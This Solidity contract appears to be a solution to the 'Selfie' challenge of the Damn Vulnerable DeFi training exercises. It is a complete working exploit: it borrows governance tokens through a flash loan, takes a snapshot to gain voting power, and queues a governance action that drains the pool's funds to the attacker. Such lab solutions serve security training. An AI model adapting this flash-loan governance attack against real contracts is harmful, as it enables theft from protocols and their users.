// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {DamnValuableTokenSnapshot} from "./../DamnValuableTokenSnapshot.sol";

contract Attack {
    address owner;
    SelfiePool public selfiePool;
    SimpleGovernance public governance;
    uint256 public drainActionId;

    constructor(SelfiePool selfiePool_, SimpleGovernance governance_) {
        owner = msg.sender;
        selfiePool = selfiePool_;
        governance = governance_;
    }

    ///@notice Take loan from pool
    function borrow(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        selfiePool.flashLoan(amount);
    }

    ///@notice Flashloan callback function
    function receiveTokens(address token, uint256 amount) external {
        require(msg.sender == address(selfiePool), "only pool");

        DamnValuableTokenSnapshot(token).snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(owner));
        drainActionId = governance.queueAction(address(selfiePool), data, 0);

        // transfer back funds
        DamnValuableTokenSnapshot(token).transfer(address(selfiePool), amount);
    }
}
